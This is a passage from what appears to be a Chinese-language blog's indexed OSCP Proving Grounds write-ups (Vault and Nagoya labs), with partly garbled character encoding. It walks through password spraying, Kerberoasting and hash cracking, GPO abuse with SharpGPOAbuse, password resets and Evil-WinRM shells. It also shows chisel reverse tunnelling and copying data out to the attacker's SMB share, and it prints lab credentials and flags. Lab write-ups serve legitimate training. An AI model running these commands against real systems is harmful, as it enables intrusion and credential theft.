[{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00 C04FB94F17}] whenchanged : 11/19/2021 9:00:32 AM objectclass : {top, container, groupPolicyContainer} gpcfunctionalityversion : 2 showinadvancedviewonly : True usnchanged : 12778 dscorepropagationdata : {11/19/2021 9:00:32 AM, 11/19/2021 8:51:14 AM, 1/1/1601 12:00:00 AM} name : {31B2F340-016D-11D2-945F-00C04FB984F9} flags : 0 cn : {31B2F340-016D-11D2-945F-00C04FB984F9} iscriticalsystemobject : True gpcfilesyspath : \\\\vault.offsec\\sysvol\\vault.offsec\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9} distinguishedname : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=vault,DC=offsec whencreated : 11/19/2021 8:50:33 AM versionnumber : 4 instancetype : 4 objectguid : 93130581-3375-49c7-88d3-afdc915a9526 objectcategory : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=vault,DC=offsec usncreated : 5675 systemflags : -1946157056 displayname : Default Domain Controllers Policy gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}] whenchanged : 11/19/2021 8:50:33 AM objectclass : {top, container, groupPolicyContainer} gpcfunctionalityversion : 2 showinadvancedviewonly : True usnchanged : 5675 dscorepropagationdata : {11/19/2021 8:51:14 AM, 1/1/1601 12:00:00 AM} name : {6AC1786C-016F-11D2-945F-00C04fB984F9} flags : 0 cn : {6AC1786C-016F-11D2-945F-00C04fB984F9} iscriticalsystemobject : True gpcfilesyspath : \\\\vault.offsec\\sysvol\\vault.offsec\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9} distinguishedname : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=vault,DC=offsec whencreated : 11/19/2021 8:50:33 AM versionnumber : 1 instancetype : 4 objectguid : 0ccc30ba-3bef-43ac-9c61-ebb814e9a685 objectcategory : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=vault,DC=offsec ä½¿ç”¨ Get-GPPermission æ£€æŸ¥é»˜è®¤ç»„ç­–ç•¥ï¼ˆDefault Group Policyï¼‰çš„æƒé™ã€‚ *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName anirudh Trustee : anirudh TrusteeType : User Permission : GpoEditDeleteModifySecurity Inherited : False â€œPermissionâ€è¡¨æ˜ anirudh ç”¨æˆ·ç¼–è¾‘ã€åˆ é™¤å’Œä¿®æ”¹æ­¤ç­–ç•¥çš„æƒé™ã€‚å¯ä»¥ä½¿ç”¨ SharpGPOAbuse å·¥å…·æ¥åˆ©ç”¨è¿™ç§é”™è¯¯é…ç½®ã€‚ ä¸‹è½½SharpGPOAbuse: https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/tools/win] â””â”€$ wget https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/SharpGPOAbuse.exe ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœº *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e upload SharpGPOAbuse.exe Info: Uploading SharpGPOAbuse.exe to C:\\Users\\anirudh\\Documents\\SharpGPOAbuse.exe Data: 94208 bytes of 94208 bytes copied Info: Upload successful! æ‰§è¡Œ SharpGPOAbuse.exeï¼Œå°†anirudhç”¨æˆ·å¸æˆ·æ·»åŠ åˆ°æœ¬åœ°ç®¡ç†å‘˜ç»„ï¼Œä¼ é€’ç”¨æˆ·åï¼Œå¹¶ä¼ é€’æˆ‘ä»¬å…·æœ‰å†™å…¥æƒé™çš„ç»„ç­–ç•¥ã€‚ *Evil-WinRM* PS C:\\Users\\anirudh\\Documents\u003e ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName \"Default Domain Policy\" [+] Domain = vault.offsec [+] Domain Controller = ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:4:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["é¶åœº"],"content":"flag anirudh/SecureHM type C:\\Users\\anirudh\\Desktop\\local.txt 6379a394e97f465833bd2a2d72fe5d56 type C:\\users\\administrator\\desktop\\proof.txt 12ef329cf77b22fb67e52b389022be6d ","date":"2024-02-09","objectID":"/posts/provinggrounds-vault/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Vault Writeup","uri":"/posts/provinggrounds-vault/"},{"categories":["é¶åœº"],"content":"Nagoya è¿™æ˜¯ç¬¬22å°ï¼ŒWindowsç³»ç»Ÿï¼Œéš¾åº¦Hardï¼Œåç§° Nagoya 192.168.166.21 ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"PortScan â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP] â””â”€$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.166.21 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-07 15:09 CST Nmap scan report for 192.168.166.21 Host is up (0.25s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-07 07:09:23Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: nagoya-industries.com0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 3389/tcp open ms-wbt-server Microsoft Terminal Services Service Info: Host: NAGOYA; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.86 seconds ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"InitAccess ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"80-Web å‘ç°80çš„WebæœåŠ¡é‡æœ‰ä¸ªTeamé¡µé¢ï¼ŒåŒ…å«äº†å›¢é˜Ÿæˆå‘˜ æ ¹æ®è¿™ä¸ªé¡µé¢åˆ¶ä½œå­—å…¸ï¼Œæˆ‘æœ€åˆè®¾è®¡çš„å­—å…¸æ ¼å¼æ˜¯ï¼šEmma Miahï¼Œ Emma.Miahï¼Œ EmmaMiah ä¸‰ç§æ ¼å¼ ä½¿ç”¨KerbruteéªŒè¯æœ‰æ•ˆçš„åŸŸç”¨æˆ·ï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ kerbrute -domain nagoya-industries.com -users ./teams.txt -dc-ip 192.168.166.21 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Valid user =\u003e Matthew.Harrison [*] Valid user =\u003e Emma.Miah [*] Valid user =\u003e Rebecca.Bell [*] Valid user =\u003e Scott.Gardner [*] Valid user =\u003e Terry.Edwards [*] Valid user =\u003e Holly.Matthews [*] Valid user =\u003e Anne.Jenkins [*] Valid user =\u003e Brett.Naylor [*] Valid user =\u003e Melissa.Mitchell [*] Valid user =\u003e Craig.Carr [*] Valid user =\u003e Fiona.Clark [*] Valid user =\u003e Patrick.Martin [*] Valid user =\u003e Kate.Watson [*] Valid user =\u003e Kirsty.Norris [*] Valid user =\u003e Andrea.Hayes [*] Valid user =\u003e Abigail.Hughes [*] Valid user =\u003e Melanie.Watson [*] Valid user =\u003e Frances.Ward [*] Valid user =\u003e Sylvia.King [*] Valid user =\u003e Wayne.Hartley [*] Valid user =\u003e Iain.White [*] Valid user =\u003e Joanna.Wood [*] Valid user =\u003e Bethan.Webster [*] Valid user =\u003e Elaine.Brady [*] Valid user =\u003e Christopher.Lewis [*] Valid user =\u003e Megan.Johnson [*] Valid user =\u003e Damien.Chapman [*] Valid user =\u003e Joanne.Lewis [*] No passwords were discovered :'( ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"Hint-1 Foothold 1 Build a username wordlist with the names found in the web app, you can try conventions like Offsec.Labs . Spraying easy password combinations like seasons + years is always a good start. ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:2","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"SMB-445 æ ¹æ®æç¤ºï¼Œæ„å»ºå¯†ç å­—å…¸ï¼Œå¦‚ï¼šSpring2023ã€Summer2023ã€Autumn2023ã€Winter2023ç­‰ã€‚ è¿™é‡Œä¸çœ‹æç¤ºçœŸçš„å¾ˆéš¾ã€‚ SMBæšä¸¾ï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ crackmapexec smb 192.168.166.21 -u ./users.txt -p 'Summer2023' --shares SMB 192.168.166.21 445 NAGOYA [*] Windows 10.0 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False) SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Matthew.Harrison:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Emma.Miah:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Rebecca.Bell:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Scott.Gardner:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Terry.Edwards:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Holly.Matthews:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Anne.Jenkins:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Brett.Naylor:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Melissa.Mitchell:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [-] nagoya-industries.com\\Craig.Carr:Summer2023 STATUS_LOGON_FAILURE SMB 192.168.166.21 445 NAGOYA [+] nagoya-industries.com\\Fiona.Clark:Summer2023 SMB 192.168.166.21 445 NAGOYA [+] Enumerated shares SMB 192.168.166.21 445 NAGOYA Share Permissions Remark SMB 192.168.166.21 445 NAGOYA ----- ----------- ------ SMB 192.168.166.21 445 NAGOYA ADMIN$ Remote Admin SMB 192.168.166.21 445 NAGOYA C$ Default share SMB 192.168.166.21 445 NAGOYA IPC$ READ Remote IPC SMB 192.168.166.21 445 NAGOYA NETLOGON READ Logon server share SMB 192.168.166.21 445 NAGOYA SYSVOL READ Logon server share æ‹¿åˆ°ä¸€å¥—æœ‰æ•ˆçš„è´¦æˆ·åå¯†ç ï¼šFiona.Clark:Summer2023 ç™»å½•SMBï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ smbclient //192.168.166.21/SYSVOL -U Fiona.Clark%Summer2023 Try \"help\" to get a list of possible commands. smb: \\\u003e ls . D 0 Sun Apr 30 14:31:25 2023 .. D 0 Sun Apr 30 14:31:25 2023 nagoya-industries.com Dr 0 Sun Apr 30 14:31:25 2023 10328063 blocks of size 4096. 4800089 blocks available ç¿»æ–‡ä»¶ï¼Œæ‰¾åˆ°ä¸€ä¸ªResetPasswordç›®å½• smb: \\\u003e ls nagoya-industries.com\\scripts\\resetpassword\\ . D 0 Sun Apr 30 16:07:07 2023 .. D 0 Sun Apr 30 16:07:07 2023 ResetPassword.exe A 5120 Mon May 1 01:04:02 2023 ResetPassword.exe.config A 189 Mon May 1 00:53:50 2023 System.IO.FileSystem.AccessControl.dll A 28552 Tue Oct 20 11:39:30 2020 System.IO.FileSystem.AccessControl.xml A 65116 Sat Oct 10 13:10:54 2020 System.Security.AccessControl.dll A 35952 Sat Oct 23 16:45:08 2021 System.Security.AccessControl.xml A 231631 Wed Oct 20 00:14:20 2021 System.Security.Permissions.dll A 30328 Wed Oct 19 09:34:02 2022 System.Security.Permissions.xml A 8987 Wed Oct 19 09:34:02 2022 System.Security.Principal.Windows.dll A 18312 Tue Oct 20 11:46:28 2020 System.Security.Principal.Windows.xml A 90968 Sat Oct 10 13:10:54 2020 10328063 blocks of size 4096. 4800089 blocks available ä¸‹è½½configå’Œxmlæ–‡ä»¶ï¼Œæ²¡å‘ç°æ•æ„Ÿä¿¡æ¯ã€‚ ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:3","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"Hint-2 Foothold 2 Enumerate shares, find the binary and reverse engineer it. Make use of credentials you found. Keep in mind that one can still enumerate ACLs without actually getting a shell ç»è¿‡æç¤ºéœ€è¦é€†å‘åˆ†æï¼Œäºæ˜¯ä¸‹è½½exeæ–‡ä»¶åˆ°æœ¬åœ°ï¼Œè¿›è¡Œé€†å‘ã€‚ å°†SMB ResetPasswordç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½æ”¾åˆ°Windows x86æ¶æ„çš„æœºå­ä¸Šï¼Œä½¿ç”¨dnSpyå·¥å…·å¯¹exeæ–‡ä»¶è¿›è¡Œé€†å‘ï¼Œå‘ç°ä¸€ç»„ç¡¬ç¼–ç æœåŠ¡è´¦æˆ·å¯†ç ï¼šsvc_helpdesk/U299iYRmikYTHDbPbxPoYYfa2j4x4cdg ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:4","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"Kerberoasting è·å–SPN â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ impacket-GetUserSPNs nagoya-industries.com/fiona.clark:'Summer2023' -dc-ip 192.168.166.21 -debug -outputfile kerberoast.txt Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket [+] Connecting to 192.168.166.21, port 389, SSL False [+] Total of records returned 5 ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------------- ------------ ------------------------------------------------ -------------------------- -------------------------- ---------- http/nagoya.nagoya-industries.com svc_helpdesk CN=helpdesk,CN=Users,DC=nagoya-industries,DC=com 2023-04-30 15:31:06.190955 \u003cnever\u003e MSSQL/nagoya.nagoya-industries.com svc_mssql 2023-04-30 15:45:33.288595 2023-06-16 05:38:06.145798 [-] CCache file is not found. Skipping... [+] The specified path is not correct or the KRB5CCNAME environment variable is not defined [+] Trying to connect to KDC at 192.168.166.21 [+] Trying to connect to KDC at 192.168.166.21 [+] Trying to connect to KDC at 192.168.166.21 [+] Trying to connect to KDC at 192.168.166.21 è§£å¯†ï¼š â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status Service1 (?) 1g 0:00:00:13 DONE (2024-02-07 17:10) 0.07189g/s 1031Kp/s 1106Kc/s 1106KC/s -xlengx-..*7Â¡Vamos! Use the \"--show\" option to display all of the cracked passwords reliably Session completed. è·å¾—ç¬¬äºŒä¸ªæœåŠ¡è´¦æˆ·å¯†ç ï¼šsvc_mssql/Service1 ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:5","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"RPC â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ rpcclient -U nagoya-industries/svc_helpdesk 192.168.166.21 Password for [NAGOYA-INDUSTRIES\\svc_helpdesk]: rpcclient $\u003e # æšä¸¾åŸŸç”¨æˆ· rpcclient $\u003e enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[svc_helpdesk] rid:[0x450] user:[Matthew.Harrison] rid:[0x452] user:[Emma.Miah] rid:[0x453] user:[Rebecca.Bell] rid:[0x454] user:[Scott.Gardner] rid:[0x455] user:[Terry.Edwards] rid:[0x456] user:[Holly.Matthews] rid:[0x457] user:[Anne.Jenkins] rid:[0x458] user:[Brett.Naylor] rid:[0x459] user:[Melissa.Mitchell] rid:[0x45a] user:[Craig.Carr] rid:[0x45b] user:[Fiona.Clark] rid:[0x45c] user:[Patrick.Martin] rid:[0x45d] user:[Kate.Watson] rid:[0x45e] user:[Kirsty.Norris] rid:[0x45f] user:[Andrea.Hayes] rid:[0x460] user:[Abigail.Hughes] rid:[0x461] user:[Melanie.Watson] rid:[0x462] user:[Frances.Ward] rid:[0x463] user:[Sylvia.King] rid:[0x464] user:[Wayne.Hartley] rid:[0x465] user:[Iain.White] rid:[0x467] user:[Joanna.Wood] rid:[0x468] user:[Bethan.Webster] rid:[0x469] user:[Elaine.Brady] rid:[0x46b] user:[Christopher.Lewis] rid:[0x46c] user:[Megan.Johnson] rid:[0x46d] user:[Damien.Chapman] rid:[0x46e] user:[Joanne.Lewis] rid:[0x46f] user:[svc_mssql] rid:[0x470] user:[svc_tpl] rid:[0x471] user:[svc_web] rid:[0x472] # æšä¸¾åŸŸå†…ç»„ rpcclient $\u003e enumdomgroups group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Admins] rid:[0x200] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Domain Controllers] rid:[0x204] group:[Schema Admins] rid:[0x206] group:[Enterprise Admins] rid:[0x207] group:[Group Policy Creator Owners] rid:[0x208] group:[Read-only Domain Controllers] rid:[0x209] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[Key Admins] rid:[0x20e] group:[Enterprise Key Admins] rid:[0x20f] group:[DnsUpdateProxy] rid:[0x44e] group:[employees] rid:[0x451] group:[helpdesk] rid:[0x466] group:[developers] rid:[0x46a] # æŸ¥è¯¢ç”¨æˆ·æ‰€å±ç»„ rpcclient $\u003e queryusergroups 0x45c group rid:[0x201] attr:[0x7] group rid:[0x451] attr:[0x7] â€¦â€¦ rpcclient $\u003e queryusergroups 0x46c group rid:[0x201] attr:[0x7] group rid:[0x46a] attr:[0x7] group rid:[0x451] attr:[0x7] å‘ç°ç”¨æˆ·Christopher.Lewis æœ‰ä¸‰ä¸ªç»„ï¼šDomain Usersã€employees å’Œ developersï¼Œæ¯”å…¶ä»–ç”¨æˆ·å¤šä¸€ä¸ª developers ç»„ï¼Œæ¨æµ‹æ˜¯å¼€å‘äººå‘˜ã€‚ è¿™é‡Œæ²¡æœ‰è¿œç¨‹ç®¡ç†çš„ç»„ï¼ŒçŒœæµ‹ developers ç»„æ˜¯å¦èƒ½è¿œç¨‹ã€‚å°è¯•ä¿®æ”¹ Christopher.Lewis ç”¨æˆ·å¯†ç ã€‚svc_helpdesk è´¦å·å¯¹christopher.lewis å…·æœ‰å®Œå…¨æ§åˆ¶æƒé™ï¼Œå¯ä»¥é‡ç½®å…¶è´¦å· rpcclient $\u003e setuserinfo christopher.lewis 23 'Admin@123' å°è¯•è¿œç¨‹ç™»å½•ã€‚ä½¿ç”¨Evil-WinRMç™»å½•æˆåŠŸ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ evil-winrm -u christopher.lewis -p 'Admin@123' -i 192.168.166.21 Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Christopher.Lewis\\Documents\u003e ls *Evil-WinRM* PS C:\\Users\\Christopher.Lewis\\Documents\u003e whoami nagoya-ind\\christopher.lewis *Evil-WinRM* PS C:\\Users\\Christopher.Lewis\u003e type C:\\local.txt 81950a6ba1771f388080cb994a7fcb33 ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:3:6","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"PrivE ä¸Šä¼ sharphoundè¿›è¡Œä¿¡æ¯æœé›† *Evil-WinRM* PS C:\\tmp\u003e upload SharpHound.exe *Evil-WinRM* PS C:\\tmp\u003e ./SharpHound.exe -c All --OutputPrefix \"Nagoya-\" *Evil-WinRM* PS C:\\tmp\u003e download Nagoya-_20240207014142_BloodHound.zip ä¸‹è½½è¿‡ç¨‹ä¸€ç›´å¤±è´¥ï¼Œä½¿ç”¨SMBè¿›è¡Œæ–‡ä»¶ä¼ è¾“ã€‚ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ impacket-smbserver share $(pwd) -smb2support Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed *Evil-WinRM* PS C:\\tmp\u003e copy Nagoya-_20240207014142_BloodHound.zip \\\\192.168.45.193\\share\\Nagoya-_20240207014142_BloodHound.zip æ²¡åˆ†æå‡ºæœ‰ç”¨ä¿¡æ¯ã€‚ ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"MSSQL è€ƒè™‘åˆ°æœ‰ä¸ªmssqlè´¦æˆ·ï¼ŒæŸ¥çœ‹å½“å‰ç«¯å£åˆ—è¡¨ï¼Œå‘ç°å­˜åœ¨1433ç«¯å£ï¼Œè¯´æ˜æœ‰mssqlæœåŠ¡ã€‚ *Evil-WinRM* PS C:\\tmp\u003e netstat -anop TCP Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:88 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 880 TCP 0.0.0.0:389 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:464 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:593 0.0.0.0:0 LISTENING 880 TCP 0.0.0.0:636 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:1433 0.0.0.0:0 LISTENING 2264 TCP 0.0.0.0:3268 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:3269 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:3389 0.0.0.0:0 LISTENING 1016 TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:9389 0.0.0.0:0 LISTENING 2624 TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:49664 0.0.0.0:0 LISTENING 480 TCP 0.0.0.0:49665 0.0.0.0:0 LISTENING 760 TCP 0.0.0.0:49666 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:49668 0.0.0.0:0 LISTENING 1008 TCP 0.0.0.0:49669 0.0.0.0:0 LISTENING 1008 TCP 0.0.0.0:49670 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:49671 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:49672 0.0.0.0:0 LISTENING 2476 TCP 0.0.0.0:49677 0.0.0.0:0 LISTENING 620 TCP 0.0.0.0:49684 0.0.0.0:0 LISTENING 628 TCP 0.0.0.0:49691 0.0.0.0:0 LISTENING 2616 TCP 0.0.0.0:49710 0.0.0.0:0 LISTENING 2648 TCP 0.0.0.0:52804 0.0.0.0:0 LISTENING 2264 TCP 127.0.0.1:53 0.0.0.0:0 LISTENING 2616 TCP 127.0.0.1:389 127.0.0.1:49674 ESTABLISHED 628 TCP 127.0.0.1:389 127.0.0.1:49676 ESTABLISHED 628 TCP 127.0.0.1:389 127.0.0.1:49742 ESTABLISHED 628 TCP 127.0.0.1:49674 127.0.0.1:389 ESTABLISHED 2684 TCP 127.0.0.1:49676 127.0.0.1:389 ESTABLISHED 2684 TCP 127.0.0.1:49742 127.0.0.1:389 ESTABLISHED 2616 TCP 192.168.166.21:53 0.0.0.0:0 LISTENING 2616 TCP 192.168.166.21:139 0.0.0.0:0 LISTENING 4 TCP 192.168.166.21:389 192.168.166.21:49771 ESTABLISHED 628 TCP 192.168.166.21:389 192.168.166.21:49839 ESTABLISHED 628 TCP 192.168.166.21:389 192.168.166.21:49846 ESTABLISHED 628 TCP 192.168.166.21:445 192.168.45.193:54162 ESTABLISHED 4 TCP 192.168.166.21:5985 192.168.45.193:34646 TIME_WAIT 0 TCP 192.168.166.21:5985 192.168.45.193:34658 ESTABLISHED 4 TCP 192.168.166.21:5985 192.168.45.193:55274 TIME_WAIT 0 TCP 192.168.166.21:49771 192.168.166.21:389 ESTABLISHED 2616 TCP 192.168.166.21:49839 192.168.166.21:389 ESTABLISHED 2648 TCP 192.168.166.21:49846 192.168.166.21:389 ESTABLISHED 2648 TCP 192.168.166.21:50482 52.168.117.173:443 ESTABLISHED 3488 TCP 192.168.166.21:50490 23.77.197.149:80 SYN_SENT 3488 ä¸Šä¼ chisel è¿›è¡Œç«¯å£è½¬å‘ï¼Œå°†1433ç«¯å£ä»£ç†å‡ºæ¥ *Evil-WinRM* PS C:\\tmp\u003e upload chisel.exe *Evil-WinRM* PS C:\\tmp\u003e cmd /c 'C:\\tmp\\chisel.exe client 192.168.45.193:8000 R:1433:127.0.0.1:1433' # kali $ chisel server -p 8000 --reverse æœ¬åœ°ç™»å½• â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya] â””â”€$ impacket-mssqlclient svc_mssql:'Service1'@127.0.0.1 -windows-auth Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(nagoya\\SQLEXPRESS): Line 1: Changed database context to 'master'. [*] INFO(nagoya\\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (160 3232) [!] Press help for extra shell commands SQL\u003e å°è¯•å¯ç”¨xp_cmdshellå¤±è´¥ï¼Œæƒé™ä¸è¶³ SQL\u003e exec xp_cmdshell 'whoami'; [-] ERROR(nagoya\\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'. SQL\u003e EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE; [-] ERROR(nagoya\\SQLEXPRESS): Line 105: User does not have permission to perform this action. [-] ERROR(nagoya\\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement. [-] ERROR(nagoya\\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option. [-] ERROR(nagoya\\SQLEXPRESS): Line 1: ","date":"2024-02-07","objectID":"/posts/provinggrounds-nagoya/:4:1","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds Nagoya Writeup","uri":"/posts/provinggrounds-nagoya/"},{"categories":["é¶åœº"],"content":"Hint-3 Escalation Perform kerberoast, crack the password of service account 